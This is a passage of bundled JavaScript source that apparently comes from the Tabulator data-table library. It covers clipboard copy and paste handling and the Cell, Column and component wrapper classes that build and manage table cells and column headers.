            plain = html2 ? this.generatePlainContent(list2) : "";
            if (this.table.options.clipboardCopyFormatter) {
              plain = this.table.options.clipboardCopyFormatter("plain", plain);
              html2 = this.table.options.clipboardCopyFormatter("html", html2);
            }
          }
          if (window.clipboardData && window.clipboardData.setData) {
            window.clipboardData.setData("Text", plain);
          } else if (e2.clipboardData && e2.clipboardData.setData) {
            e2.clipboardData.setData("text/plain", plain);
            if (html2) {
              e2.clipboardData.setData("text/html", html2);
            }
          } else if (e2.originalEvent && e2.originalEvent.clipboardData.setData) {
            e2.originalEvent.clipboardData.setData("text/plain", plain);
            if (html2) {
              e2.originalEvent.clipboardData.setData("text/html", html2);
            }
          }
          this.dispatchExternal("clipboardCopied", plain, html2);
          this.reset();
        }
      });
    }
    if (this.mode === true || this.mode === "paste") {
      this.table.element.addEventListener("paste", (e2) => {
        this.paste(e2);
      });
    }
    this.setPasteParser(this.table.options.clipboardPasteParser);
    this.setPasteAction(this.table.options.clipboardPasteAction);
    this.registerTableFunction("copyToClipboard", this.copy.bind(this));
  }
  reset() {
    this.blocked = true;
    this.customSelection = false;
  }
  generatePlainContent(list2) {
    var output = [];
    list2.forEach((row) => {
      var rowData = [];
      row.columns.forEach((col) => {
        var value = "";
        if (col) {
          if (row.type === "group") {
            col.value = col.component.getKey();
          }
          if (col.value === null) {
            value = "";
          } else {
            switch (typeof col.value) {
              case "object":
                value = JSON.stringify(col.value);
                break;
              case "undefined":
                value = "";
                break;
              default:
                value = col.value;
            }
          }
        }
        rowData.push(value);
      });
      output.push(rowData.join("	"));
    });
    return output.join("\n");
  }
  copy(range2, internal) {
    var sel, textRange;
    this.blocked = false;
    this.customSelection = false;
    if (this.mode === true || this.mode === "copy") {
      this.rowRange = range2 || this.table.options.clipboardCopyRowRange;
      if (typeof window.getSelection != "undefined" && typeof document.createRange != "undefined") {
        range2 = document.createRange();
        range2.selectNodeContents(this.table.element);
        sel = window.getSelection();
        if (sel.toString() && internal) {
          this.customSelection = sel.toString();
        }
        sel.removeAllRanges();
        sel.addRange(range2);
      } else if (typeof document.selection != "undefined" && typeof document.body.createTextRange != "undefined") {
        textRange = document.body.createTextRange();
        textRange.moveToElementText(this.table.element);
        textRange.select();
      }
      document.execCommand("copy");
      if (sel) {
        sel.removeAllRanges();
      }
    }
  }
  //PASTE EVENT HANDLING
  setPasteAction(action) {
    switch (typeof action) {
      case "string":
        this.pasteAction = Clipboard.pasteActions[action];
        if (!this.pasteAction) {
          console.warn("Clipboard Error - No such paste action found:", action);
        }
        break;
      case "function":
        this.pasteAction = action;
        break;
    }
  }
  setPasteParser(parser) {
    switch (typeof parser) {
      case "string":
        this.pasteParser = Clipboard.pasteParsers[parser];
        if (!this.pasteParser) {
          console.warn("Clipboard Error - No such paste parser found:", parser);
        }
        break;
      case "function":
        this.pasteParser = parser;
        break;
    }
  }
  paste(e2) {
    var data, rowData, rows2;
    if (this.checkPasteOrigin(e2)) {
      data = this.getPasteData(e2);
      rowData = this.pasteParser.call(this, data);
      if (rowData) {
        e2.preventDefault();
        if (this.table.modExists("mutator")) {
          rowData = this.mutateData(rowData);
        }
        rows2 = this.pasteAction.call(this, rowData);
        this.dispatchExternal("clipboardPasted", data, rowData, rows2);
      } else {
        this.dispatchExternal("clipboardPasteError", data);
      }
    }
  }
  mutateData(data) {
    var output = [];
    if (Array.isArray(data)) {
      data.forEach((row) => {
        output.push(this.table.modules.mutator.transformRow(row, "clipboard"));
      });
    } else {
      output = data;
    }
    return output;
  }
  checkPasteOrigin(e2) {
    var valid = true;
    var blocked = this.confirm("clipboard-paste", [e2]);
    if (blocked || !["DIV", "SPAN"].includes(e2.target.tagName)) {
      valid = false;
    }
    return valid;
  }
  getPasteData(e2) {
    var data;
    if (window.clipboardData && window.clipboardData.getData) {
      data = window.clipboardData.getData("Text");
    } else if (e2.clipboardData && e2.clipboardData.getData) {
      data = e2.clipboardData.getData("text/plain");
    } else if (e2.originalEvent && e2.originalEvent.clipboardData.getData) {
      data = e2.originalEvent.clipboardData.getData("text/plain");
    }
    return data;
  }
}
class CalcComponent {
  constructor(row) {
    this._row = row;
    return new Proxy(this, {
      get: function(target, name, receiver) {
        if (typeof target[name] !== "undefined") {
          return target[name];
        } else {
          return target._row.table.componentFunctionBinder.handle("row", target._row, name);
        }
      }
    });
  }
  getData(transform) {
    return this._row.getData(transform);
  }
  getElement() {
    return this._row.getElement();
  }
  getTable() {
    return this._row.table;
  }
  getCells() {
    var cells = [];
    this._row.getCells().forEach(function(cell) {
      cells.push(cell.getComponent());
    });
    return cells;
  }
  getCell(column) {
    var cell = this._row.getCell(column);
    return cell ? cell.getComponent() : false;
  }
  _getSelf() {
    return this._row;
  }
}
class CellComponent {
  constructor(cell) {
    this._cell = cell;
    return new Proxy(this, {
      get: function(target, name, receiver) {
        if (typeof target[name] !== "undefined") {
          return target[name];
        } else {
          return target._cell.table.componentFunctionBinder.handle("cell", target._cell, name);
        }
      }
    });
  }
  getValue() {
    return this._cell.getValue();
  }
  getOldValue() {
    return this._cell.getOldValue();
  }
  getInitialValue() {
    return this._cell.initialValue;
  }
  getElement() {
    return this._cell.getElement();
  }
  getRow() {
    return this._cell.row.getComponent();
  }
  getData(transform) {
    return this._cell.row.getData(transform);
  }
  getType() {
    return "cell";
  }
  getField() {
    return this._cell.column.getField();
  }
  getColumn() {
    return this._cell.column.getComponent();
  }
  setValue(value, mutate) {
    if (typeof mutate == "undefined") {
      mutate = true;
    }
    this._cell.setValue(value, mutate);
  }
  restoreOldValue() {
    this._cell.setValueActual(this._cell.getOldValue());
  }
  restoreInitialValue() {
    this._cell.setValueActual(this._cell.initialValue);
  }
  checkHeight() {
    this._cell.checkHeight();
  }
  getTable() {
    return this._cell.table;
  }
  _getSelf() {
    return this._cell;
  }
}
class Cell extends CoreFeature {
  constructor(column, row) {
    super(column.table);
    this.table = column.table;
    this.column = column;
    this.row = row;
    this.element = null;
    this.value = null;
    this.initialValue;
    this.oldValue = null;
    this.modules = {};
    this.height = null;
    this.width = null;
    this.minWidth = null;
    this.component = null;
    this.loaded = false;
    this.build();
  }
  //////////////// Setup Functions /////////////////
  //generate element
  build() {
    this.generateElement();
    this.setWidth();
    this._configureCell();
    this.setValueActual(this.column.getFieldValue(this.row.data));
    this.initialValue = this.value;
  }
  generateElement() {
    this.element = document.createElement("div");
    this.element.className = "tabulator-cell";
    this.element.setAttribute("role", "gridcell");
    if (this.column.isRowHeader) {
      this.element.classList.add("tabulator-row-header");
    }
  }
  _configureCell() {
    var element = this.element, field = this.column.getField(), vertAligns = {
      top: "flex-start",
      bottom: "flex-end",
      middle: "center"
    }, hozAligns = {
      left: "flex-start",
      right: "flex-end",
      center: "center"
    };
    element.style.textAlign = this.column.hozAlign;
    if (this.column.vertAlign) {
      element.style.display = "inline-flex";
      element.style.alignItems = vertAligns[this.column.vertAlign] || "";
      if (this.column.hozAlign) {
        element.style.justifyContent = hozAligns[this.column.hozAlign] || "";
      }
    }
    if (field) {
      element.setAttribute("tabulator-field", field);
    }
    if (this.column.definition.cssClass) {
      var classNames2 = this.column.definition.cssClass.split(" ");
      classNames2.forEach((className) => {
        element.classList.add(className);
      });
    }
    this.dispatch("cell-init", this);
    if (!this.column.visible) {
      this.hide();
    }
  }
  //generate cell contents
  _generateContents() {
    var val;
    val = this.chain("cell-format", this, null, () => {
      return this.element.innerHTML = this.value;
    });
    switch (typeof val) {
      case "object":
        if (val instanceof Node) {
          while (this.element.firstChild) this.element.removeChild(this.element.firstChild);
          this.element.appendChild(val);
        } else {
          this.element.innerHTML = "";
          if (val != null) {
            console.warn("Format Error - Formatter has returned a type of object, the only valid formatter object return is an instance of Node, the formatter returned:", val);
          }
        }
        break;
      case "undefined":
        this.element.innerHTML = "";
        break;
      default:
        this.element.innerHTML = val;
    }
  }
  cellRendered() {
    this.dispatch("cell-rendered", this);
  }
  //////////////////// Getters ////////////////////
  getElement(containerOnly) {
    if (!this.loaded) {
      this.loaded = true;
      if (!containerOnly) {
        this.layoutElement();
      }
    }
    return this.element;
  }
  getValue() {
    return this.value;
  }
  getOldValue() {
    return this.oldValue;
  }
  //////////////////// Actions ////////////////////
  setValue(value, mutate, force) {
    var changed = this.setValueProcessData(value, mutate, force);
    if (changed) {
      this.dispatch("cell-value-updated", this);
      this.cellRendered();
      if (this.column.definition.cellEdited) {
        this.column.definition.cellEdited.call(this.table, this.getComponent());
      }
      this.dispatchExternal("cellEdited", this.getComponent());
      if (this.subscribedExternal("dataChanged")) {
        this.dispatchExternal("dataChanged", this.table.rowManager.getData());
      }
    }
  }
  setValueProcessData(value, mutate, force) {
    var changed = false;
    if (this.value !== value || force) {
      changed = true;
      if (mutate) {
        value = this.chain("cell-value-changing", [this, value], null, value);
      }
    }
    this.setValueActual(value);
    if (changed) {
      this.dispatch("cell-value-changed", this);
    }
    return changed;
  }
  setValueActual(value) {
    this.oldValue = this.value;
    this.value = value;
    this.dispatch("cell-value-save-before", this);
    this.column.setFieldValue(this.row.data, value);
    this.dispatch("cell-value-save-after", this);
    if (this.loaded) {
      this.layoutElement();
    }
  }
  layoutElement() {
    this._generateContents();
    this.dispatch("cell-layout", this);
  }
  setWidth() {
    this.width = this.column.width;
    this.element.style.width = this.column.widthStyled;
  }
  clearWidth() {
    this.width = "";
    this.element.style.width = "";
  }
  getWidth() {
    return this.width || this.element.offsetWidth;
  }
  setMinWidth() {
    this.minWidth = this.column.minWidth;
    this.element.style.minWidth = this.column.minWidthStyled;
  }
  setMaxWidth() {
    this.maxWidth = this.column.maxWidth;
    this.element.style.maxWidth = this.column.maxWidthStyled;
  }
  checkHeight() {
    this.row.reinitializeHeight();
  }
  clearHeight() {
    this.element.style.height = "";
    this.height = null;
    this.dispatch("cell-height", this, "");
  }
  setHeight() {
    this.height = this.row.height;
    this.element.style.height = this.row.heightStyled;
    this.dispatch("cell-height", this, this.row.heightStyled);
  }
  getHeight() {
    return this.height || this.element.offsetHeight;
  }
  show() {
    this.element.style.display = this.column.vertAlign ? "inline-flex" : "";
  }
  hide() {
    this.element.style.display = "none";
  }
  delete() {
    this.dispatch("cell-delete", this);
    if (!this.table.rowManager.redrawBlock && this.element.parentNode) {
      this.element.parentNode.removeChild(this.element);
    }
    this.element = false;
    this.column.deleteCell(this);
    this.row.deleteCell(this);
    this.calcs = {};
  }
  getIndex() {
    return this.row.getCellIndex(this);
  }
  //////////////// Object Generation /////////////////
  getComponent() {
    if (!this.component) {
      this.component = new CellComponent(this);
    }
    return this.component;
  }
}
class ColumnComponent {
  constructor(column) {
    this._column = column;
    this.type = "ColumnComponent";
    return new Proxy(this, {
      get: function(target, name, receiver) {
        if (typeof target[name] !== "undefined") {
          return target[name];
        } else {
          return target._column.table.componentFunctionBinder.handle("column", target._column, name);
        }
      }
    });
  }
  getElement() {
    return this._column.getElement();
  }
  getDefinition() {
    return this._column.getDefinition();
  }
  getField() {
    return this._column.getField();
  }
  getTitleDownload() {
    return this._column.getTitleDownload();
  }
  getCells() {
    var cells = [];
    this._column.cells.forEach(function(cell) {
      cells.push(cell.getComponent());
    });
    return cells;
  }
  isVisible() {
    return this._column.visible;
  }
  show() {
    if (this._column.isGroup) {
      this._column.columns.forEach(function(column) {
        column.show();
      });
    } else {
      this._column.show();
    }
  }
  hide() {
    if (this._column.isGroup) {
      this._column.columns.forEach(function(column) {
        column.hide();
      });
    } else {
      this._column.hide();
    }
  }
  toggle() {
    if (this._column.visible) {
      this.hide();
    } else {
      this.show();
    }
  }
  delete() {
    return this._column.delete();
  }
  getSubColumns() {
    var output = [];
    if (this._column.columns.length) {
      this._column.columns.forEach(function(column) {
        output.push(column.getComponent());
      });
    }
    return output;
  }
  getParentColumn() {
    return this._column.getParentComponent();
  }
  _getSelf() {
    return this._column;
  }
  scrollTo(position, ifVisible) {
    return this._column.table.columnManager.scrollToColumn(this._column, position, ifVisible);
  }
  getTable() {
    return this._column.table;
  }
  move(to, after) {
    var toColumn = this._column.table.columnManager.findColumn(to);
    if (toColumn) {
      this._column.table.columnManager.moveColumn(this._column, toColumn, after);
    } else {
      console.warn("Move Error - No matching column found:", toColumn);
    }
  }
  getNextColumn() {
    var nextCol = this._column.nextColumn();
    return nextCol ? nextCol.getComponent() : false;
  }
  getPrevColumn() {
    var prevCol = this._column.prevColumn();
    return prevCol ? prevCol.getComponent() : false;
  }
  updateDefinition(updates) {
    return this._column.updateDefinition(updates);
  }
  getWidth() {
    return this._column.getWidth();
  }
  setWidth(width) {
    var result;
    if (width === true) {
      result = this._column.reinitializeWidth(true);
    } else {
      result = this._column.setWidth(width);
    }
    this._column.table.columnManager.rerenderColumns(true);
    return result;
  }
}
var defaultColumnOptions = {
  "title": void 0,
  "field": void 0,
  "columns": void 0,
  "visible": void 0,
  "hozAlign": void 0,
  "vertAlign": void 0,
  "width": void 0,
  "minWidth": 40,
  "maxWidth": void 0,
  "maxInitialWidth": void 0,
  "cssClass": void 0,
  "variableHeight": void 0,
  "headerVertical": void 0,
  "headerHozAlign": void 0,
  "headerWordWrap": false,
  "editableTitle": void 0
};
class Column extends CoreFeature {
  static defaultOptionList = defaultColumnOptions;
  constructor(def, parent, rowHeader) {
    super(parent.table);
    this.definition = def;
    this.parent = parent;
    this.type = "column";
    this.columns = [];
    this.cells = [];
    this.isGroup = false;
    this.isRowHeader = rowHeader;
    this.element = this.createElement();
    this.contentElement = false;
    this.titleHolderElement = false;
    this.titleElement = false;
    this.groupElement = this.createGroupElement();
    this.hozAlign = "";
    this.vertAlign = "";
    this.field = "";
    this.fieldStructure = "";
    this.getFieldValue = "";
    this.setFieldValue = "";
    this.titleDownload = null;
    this.titleFormatterRendered = false;
    this.mapDefinitions();
    this.setField(this.definition.field);
    this.modules = {};
    this.width = null;
    this.widthStyled = "";
    this.maxWidth = null;
    this.maxWidthStyled = "";
    this.maxInitialWidth = null;
    this.minWidth = null;
    this.minWidthStyled = "";
    this.widthFixed = false;
    this.visible = true;
    this.component = null;
    if (this.definition.columns) {
      this.isGroup = true;
      this.definition.columns.forEach((def2, i2) => {
        var newCol = new Column(def2, this);
        this.attachColumn(newCol);
      });
      this.checkColumnVisibility();
    } else {
      parent.registerColumnField(this);
    }
    this._initialize();
  }
  createElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-col");
    el.setAttribute("role", "columnheader");
    el.setAttribute("aria-sort", "none");
    if (this.isRowHeader) {
      el.classList.add("tabulator-row-header");
    }
    switch (this.table.options.columnHeaderVertAlign) {
      case "middle":
        el.style.justifyContent = "center";
        break;
      case "bottom":
        el.style.justifyContent = "flex-end";
        break;
    }
    return el;
  }
  createGroupElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-col-group-cols");
    return el;
  }
  mapDefinitions() {
    var defaults2 = this.table.options.columnDefaults;
    if (defaults2) {
      for (let key in defaults2) {
        if (typeof this.definition[key] === "undefined") {
          this.definition[key] = defaults2[key];
        }
      }
    }
    this.definition = this.table.columnManager.optionsList.generate(Column.defaultOptionList, this.definition);
  }
  checkDefinition() {
    Object.keys(this.definition).forEach((key) => {
      if (Column.defaultOptionList.indexOf(key) === -1) {
        console.warn("Invalid column definition option in '" + (this.field || this.definition.title) + "' column:", key);
      }
    });
  }
  setField(field) {
    this.field = field;
    this.fieldStructure = field ? this.table.options.nestedFieldSeparator ? field.split(this.table.options.nestedFieldSeparator) : [field] : [];
    this.getFieldValue = this.fieldStructure.length > 1 ? this._getNestedData : this._getFlatData;
    this.setFieldValue = this.fieldStructure.length > 1 ? this._setNestedData : this._setFlatData;
  }
  //register column position with column manager
  registerColumnPosition(column) {
    this.parent.registerColumnPosition(column);
  }
  //register column position with column manager
  registerColumnField(column) {
    this.parent.registerColumnField(column);
  }
  //trigger position registration
  reRegisterPosition() {
    if (this.isGroup) {
      this.columns.forEach(function(column) {
        column.reRegisterPosition();
      });
    } else {
      this.registerColumnPosition(this);
    }
  }
  //build header element
  _initialize() {
    var def = this.definition;
    while (this.element.firstChild) this.element.removeChild(this.element.firstChild);
    if (def.headerVertical) {
      this.element.classList.add("tabulator-col-vertical");
      if (def.headerVertical === "flip") {
        this.element.classList.add("tabulator-col-vertical-flip");
      }
    }
    this.contentElement = this._buildColumnHeaderContent();
    this.element.appendChild(this.contentElement);
    if (this.isGroup) {
      this._buildGroupHeader();
    } else {
      this._buildColumnHeader();
    }
    this.dispatch("column-init", this);
  }
  //build header element for header
  _buildColumnHeader() {
    var def = this.definition;
    this.dispatch("column-layout", this);
    if (typeof def.visible != "undefined") {
      if (def.visible) {
        this.show(true);
      } else {
        this.hide(true);
      }
    }
    if (def.cssClass) {
      var classNames2 = def.cssClass.split(" ");
      classNames2.forEach((className) => {
        this.element.classList.add(className);
      });
    }
    if (def.field) {
      this.element.setAttribute("tabulator-field", def.field);
    }
    this.setMinWidth(parseInt(def.minWidth));
    if (def.maxInitialWidth) {
      this.maxInitialWidth = parseInt(def.maxInitialWidth);
    }
    if (def.maxWidth) {
      this.setMaxWidth(parseInt(def.maxWidth));
    }
    this.reinitializeWidth();
    this.hozAlign = this.definition.hozAlign;
    this.vertAlign = this.definition.vertAlign;
    this.titleElement.style.textAlign = this.definition.headerHozAlign;
  }
  _buildColumnHeaderContent() {
    var contentElement = document.createElement("div");
    contentElement.classList.add("tabulator-col-content");
    this.titleHolderElement = document.createElement("div");
    this.titleHolderElement.classList.add("tabulator-col-title-holder");
    contentElement.appendChild(this.titleHolderElement);
    this.titleElement = this._buildColumnHeaderTitle();
    this.titleHolderElement.appendChild(this.titleElement);
    return contentElement;
  }
  //build title element of column
  _buildColumnHeaderTitle() {
    var def = this.definition;
    var titleHolderElement = document.createElement("div");
    titleHolderElement.classList.add("tabulator-col-title");
    if (def.headerWordWrap) {
      titleHolderElement.classList.add("tabulator-col-title-wrap");
    }
    if (def.editableTitle) {
      var titleElement = document.createElement("input");
      titleElement.classList.add("tabulator-title-editor");
      titleElement.addEventListener("click", (e2) => {
        e2.stopPropagation();
        titleElement.focus();
      });
      titleElement.addEventListener("mousedown", (e2) => {
        e2.stopPropagation();
      });
      titleElement.addEventListener("change", () => {
        def.title = titleElement.value;
        this.dispatchExternal("columnTitleChanged", this.getComponent());
      });
      titleHolderElement.appendChild(titleElement);
      if (def.field) {
        this.langBind("columns|" + def.field, (text) => {
          titleElement.value = text || (def.title || "&nbsp;");
        });
      } else {
        titleElement.value = def.title || "&nbsp;";
      }
    } else {
      if (def.field) {
        this.langBind("columns|" + def.field, (text) => {
          this._formatColumnHeaderTitle(titleHolderElement, text || (def.title || "&nbsp;"));
        });
      } else {
        this._formatColumnHeaderTitle(titleHolderElement, def.title || "&nbsp;");
      }
    }
    return titleHolderElement;
  }
  _formatColumnHeaderTitle(el, title) {
    var contents = this.chain("column-format", [this, title, el], null, () => {
      return title;
    });
    switch (typeof contents) {
      case "object":
        if (contents instanceof Node) {
          el.appendChild(contents);
        } else {
          el.innerHTML = "";
          console.warn("Format Error - Title formatter has returned a type of object, the only valid formatter object return is an instance of Node, the formatter returned:", contents);
        }
        break;
      case "undefined":
        el.innerHTML = "";
        break;
      default:
        el.innerHTML = contents;
    }
  }
  //build header element for column group
  _buildGroupHeader() {
    this.element.classList.add("tabulator-col-group");
    this.element.setAttribute("role", "columngroup");
    this.element.setAttribute("aria-title", this.definition.title);
    if (this.definition.cssClass) {
      var classNames2 = this.definition.cssClass.split(" ");
      classNames2.forEach((className) => {
        this.element.classList.add(className);
      });
    }
    this.titleElement.style.textAlign = this.definition.headerHozAlign;
    this.element.appendChild(this.groupElement);
  }
  //flat field lookup
  _getFlatData(data) {
    return data[this.field];
  }
  //nested field lookup
  _getNestedData(data) {
    var dataObj = data, structure = this.fieldStructure, length = structure.length, output;
    for (let i2 = 0; i2 < length; i2++) {
      dataObj = dataObj[structure[i2]];
      output = dataObj;
      if (!dataObj) {
        break;
      }
    }
    return output;
  }
  //flat field set
  _setFlatData(data, value) {
    if (this.field) {
      data[this.field] = value;
    }
  }
  //nested field set
  _setNestedData(data, value) {
    var dataObj = data, structure = this.fieldStructure, length = structure.length;
    for (let i2 = 0; i2 < length; i2++) {
      if (i2 == length - 1) {
        dataObj[structure[i2]] = value;
      } else {
        if (!dataObj[structure[i2]]) {
          if (typeof value !== "undefined") {
            dataObj[structure[i2]] = {};
          } else {
            break;
          }
        }
        dataObj = dataObj[structure[i2]];
      }
    }
  }
  //attach column to this group
  attachColumn(column) {
    if (this.groupElement) {
      this.columns.push(column);
      this.groupElement.appendChild(column.getElement());
      column.columnRendered();
    } else {
      console.warn("Column Warning - Column being attached to another column instead of column group");
    }
  }
  //vertically align header in column
  verticalAlign(alignment, height) {
    var parentHeight = this.parent.isGroup ? this.parent.getGroupElement().clientHeight : height || this.parent.getHeadersElement().clientHeight;
    this.element.style.height = parentHeight + "px";
    this.dispatch("column-height", this, this.element.style.height);
    if (this.isGroup) {
      this.groupElement.style.minHeight = parentHeight - this.contentElement.offsetHeight + "px";
    }
    this.columns.forEach(function(column) {
      column.verticalAlign(alignment);
    });
  }
  //clear vertical alignment
  clearVerticalAlign() {
    this.element.style.paddingTop = "";
    this.element.style.height = "";
    this.element.style.minHeight = "";
    this.groupElement.style.minHeight = "";
    this.columns.forEach(function(column) {
      column.clearVerticalAlign();
    });
    this.dispatch("column-height", this, "");
  }
  //// Retrieve Column Information ////
  //return column header element
  getElement() {
    return this.element;
  }
  //return column group element
  getGroupElement() {
    return this.groupElement;
  }
  //return field name
  getField() {
    return this.field;
  }
  getTitleDownload() {
    return this.titleDownload;
  }
  //return the first column in a group
  getFirstColumn() {
    if (!this.isGroup) {
      return this;
    } else {
      if (this.columns.length) {
        return this.columns[0].getFirstColumn();
      } else {
        return false;
      }
    }
  }
  //return the last column in a group
  getLastColumn() {
    if (!this.isGroup) {
      return this;
    } else {
      if (this.columns.length) {
        return this.columns[this.columns.length - 1].getLastColumn();
      } else {
        return false;
      }
    }
  }
  //return all columns in a group
  getColumns(traverse) {
    var columns = [];
    if (traverse) {
      this.columns.forEach((column) => {
        columns.push(column);
        columns = columns.concat(column.getColumns(true));
      });
    } else {
      columns = this.columns;
    }
    return columns;
  }
  //return all columns in a group
  getCells() {
    return this.cells;
  }
  //retrieve the top column in a group of columns
  getTopColumn() {
    if (this.parent.isGroup) {
      return this.parent.getTopColumn();
    } else {
      return this;
    }
  }
  //return column definition object
  getDefinition(updateBranches) {
    var colDefs = [];
    if (this.isGroup && updateBranches) {
      this.columns.forEach(function(column) {
        colDefs.push(column.getDefinition(true));
      });
      this.definition.columns = colDefs;
    }
    return this.definition;
  }
  //////////////////// Actions ////////////////////
  checkColumnVisibility() {
    var visible = false;
    this.columns.forEach(function(column) {
      if (column.visible) {
        visible = true;
      }
    });
    if (visible) {
      this.show();
      this.dispatchExternal("columnVisibilityChanged", this.getComponent(), false);
    } else {
      this.hide();
    }
  }
  //show column
  show(silent, responsiveToggle) {
    if (!this.visible) {
      this.visible = true;
      this.element.style.display = "";
      if (this.parent.isGroup) {
        this.parent.checkColumnVisibility();
      }
      this.cells.forEach(function(cell) {
        cell.show();
      });
      if (!this.isGroup && this.width === null) {
        this.reinitializeWidth();
      }
      this.table.columnManager.verticalAlignHeaders();
      this.dispatch("column-show", this, responsiveToggle);
      if (!silent) {
        this.dispatchExternal("columnVisibilityChanged", this.getComponent(), true);
      }
      if (this.parent.isGroup) {
        this.parent.matchChildWidths();
      }
      if (!this.silent) {
        this.table.columnManager.rerenderColumns();
      }
    }
  }
  //hide column
  hide(silent, responsiveToggle) {
    if (this.visible) {
      this.visible = false;
      this.element.style.display = "none";
      this.table.columnManager.verticalAlignHeaders();
      if (this.parent.isGroup) {
        this.parent.checkColumnVisibility();
      }
      this.cells.forEach(function(cell) {
        cell.hide();
      });
      this.dispatch("column-hide", this, responsiveToggle);
      if (!silent) {
        this.dispatchExternal("columnVisibilityChanged", this.getComponent(), false);
      }
      if (this.parent.isGroup) {
        this.parent.matchChildWidths();
      }
      if (!this.silent) {
        this.table.columnManager.rerenderColumns();
      }
    }
  }
  matchChildWidths() {
    var childWidth = 0;
    if (this.contentElement && this.columns.length) {
      this.columns.forEach(function(column) {
        if (column.visible) {
          childWidth += column.getWidth();
        }
      });
      this.contentElement.style.maxWidth = childWidth - 1 + "px";
      if (this.table.initialized) {
        this.element.style.width = childWidth + "px";
      }
      if (this.parent.isGroup) {
        this.parent.matchChildWidths();
      }
    }
  }
  removeChild(child) {
    var index = this.columns.indexOf(child);
    if (index > -1) {
      this.columns.splice(index, 1);
    }
    if (!this.columns.length) {
      this.delete();
    }
  }
  setWidth(width) {
    this.widthFixed = true;
    this.setWidthActual(width);
  }
  setWidthActual(width) {
    if (isNaN(width)) {
      width = Math.floor(this.table.element.clientWidth / 100 * parseInt(width));
    }
    width = Math.max(this.minWidth, width);
    if (this.maxWidth) {
      width = Math.min(this.maxWidth, width);
    }
    this.width = width;
    this.widthStyled = width ? width + "px" : "";
    this.element.style.width = this.widthStyled;
    if (!this.isGroup) {
      this.cells.forEach(function(cell) {
        cell.setWidth();
      });
    }
    if (this.parent.isGroup) {
      this.parent.matchChildWidths();
    }
    this.dispatch("column-width", this);
    if (this.subscribedExternal("columnWidth")) {
      this.dispatchExternal("columnWidth", this.getComponent());
    }
  }
  checkCellHeights() {
    var rows2 = [];
    this.cells.forEach(function(cell) {
      if (cell.row.heightInitialized) {
        if (cell.row.getElement().offsetParent !== null) {
          rows2.push(cell.row);
          cell.row.clearCellHeight();
        } else {
          cell.row.heightInitialized = false;
        }
      }
    });
    rows2.forEach(function(row) {
      row.calcHeight();
    });
    rows2.forEach(function(row) {
      row.setCellHeight();
    });
  }
  getWidth() {
    var width = 0;
    if (this.isGroup) {
      this.columns.forEach(function(column) {
        if (column.visible) {
          width += column.getWidth();
        }
      });
    } else {
      width = this.width;
    }
    return width;
  }
  getLeftOffset() {
    var offset2 = this.element.offsetLeft;
    if (this.parent.isGroup) {
      offset2 += this.parent.getLeftOffset();
    }
    return offset2;
  }
  getHeight() {
    return Math.ceil(this.element.getBoundingClientRect().height);
  }
  setMinWidth(minWidth) {
    if (this.maxWidth && minWidth > this.maxWidth) {
      minWidth = this.maxWidth;
      console.warn("the minWidth (" + minWidth + "px) for column '" + this.field + "' cannot be bigger that its maxWidth (" + this.maxWidthStyled + ")");
    }
    this.minWidth = minWidth;
    this.minWidthStyled = minWidth ? minWidth + "px" : "";
    this.element.style.minWidth = this.minWidthStyled;
    this.cells.forEach(function(cell) {
      cell.setMinWidth();
    });
  }
  setMaxWidth(maxWidth) {
    if (this.minWidth && maxWidth < this.minWidth) {
      maxWidth = this.minWidth;
      console.warn("the maxWidth (" + maxWidth + "px) for column '" + this.field + "' cannot be smaller that its minWidth (" + this.minWidthStyled + ")");
    }
    this.maxWidth = maxWidth;
    this.maxWidthStyled = maxWidth ? maxWidth + "px" : "";
    this.element.style.maxWidth = this.maxWidthStyled;
    this.cells.forEach(function(cell) {
      cell.setMaxWidth();
    });
  }
  delete() {
    return new Promise((resolve, reject) => {
      if (this.isGroup) {
        this.columns.forEach(function(column) {
          column.delete();
        });
      }
      this.dispatch("column-delete", this);
      var cellCount = this.cells.length;
      for (let i2 = 0; i2 < cellCount; i2++) {
        this.cells[0].delete();
      }
      if (this.element.parentNode) {
        this.element.parentNode.removeChild(this.element);
      }
      this.element = false;
      this.contentElement = false;
      this.titleElement = false;
      this.groupElement = false;
      if (this.parent.isGroup) {
        this.parent.removeChild(this);
      }
      this.table.columnManager.deregisterColumn(this);
      this.table.columnManager.rerenderColumns(true);
      this.dispatch("column-deleted", this);
      resolve();
    });
  }
  columnRendered() {
    if (this.titleFormatterRendered) {
      this.titleFormatterRendered();
    }
    this.dispatch("column-rendered", this);
  }
  //////////////// Cell Management /////////////////
  //generate cell for this column
  generateCell(row) {
    var cell = new Cell(this, row);
    this.cells.push(cell);
    return cell;
  }
  nextColumn() {
    var index = this.table.columnManager.findColumnIndex(this);
    return index > -1 ? this._nextVisibleColumn(index + 1) : false;
  }
  _nextVisibleColumn(index) {
    var column = this.table.columnManager.getColumnByIndex(index);
    return !column || column.visible ? column : this._nextVisibleColumn(index + 1);
  }
  prevColumn() {
    var index = this.table.columnManager.findColumnIndex(this);
    return index > -1 ? this._prevVisibleColumn(index - 1) : false;
  }
  _prevVisibleColumn(index) {
    var column = this.table.columnManager.getColumnByIndex(index);
    return !column || column.visible ? column : this._prevVisibleColumn(index - 1);
  }
  reinitializeWidth(force) {
    this.widthFixed = false;
    if (typeof this.definition.width !== "undefined" && !force) {
      this.setWidth(this.definition.width);
    }
    this.dispatch("column-width-fit-before", this);
    this.fitToData(force);
    this.dispatch("column-width-fit-after", this);
  }
  //set column width to maximum cell width for non group columns
  fitToData(force) {
    if (this.isGroup) {
      return;
    }
    if (!this.widthFixed) {
      this.element.style.width = "";
      this.cells.forEach((cell) => {
        cell.clearWidth();
      });
    }
    var maxWidth = this.element.offsetWidth;
    if (!this.width || !this.widthFixed) {
      this.cells.forEach((cell) => {
        var width = cell.getWidth();
        if (width > maxWidth) {
          maxWidth = width;
        }
      });
      if (maxWidth) {
        var setTo = maxWidth + 1;
        if (this.maxInitialWidth && !force) {
          setTo = Math.min(setTo, this.maxInitialWidth);
        }
        this.setWidthActual(setTo);
      }
    }
  }
  updateDefinition(updates) {
    var definition;
    if (!this.isGroup) {
      if (!this.parent.isGroup) {
        definition = Object.assign({}, this.getDefinition());
        definition = Object.assign(definition, updates);
        return this.table.columnManager.addColumn(definition, false, this).then((column) => {
          if (definition.field == this.field) {
            this.field = false;
          }
          return this.delete().then(() => {
            return column.getComponent();
          });
        });
      } else {
        console.error("Column Update Error - The updateDefinition function is only available on ungrouped columns");
        return Promise.reject("Column Update Error - The updateDefinition function is only available on columns, not column groups");
      }
    } else {
